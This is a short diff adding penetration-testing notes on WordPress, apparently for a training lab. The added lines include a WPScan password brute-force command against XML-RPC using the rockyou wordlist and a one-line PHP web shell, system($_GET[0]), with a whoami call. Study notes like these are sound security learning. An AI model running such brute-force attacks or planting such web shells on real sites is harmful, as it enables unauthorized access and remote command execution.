@@ -25,3 +25,10 @@ WordPress:
   wp-login.php      登录后端
 
   https://github.com/wpscanteam/wpscan
+  https://wpscan.com/
+
+  sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+  https://kinsta.com/blog/xmlrpc-php/
+
+  system($_GET[0]);
+  ?0=whoami
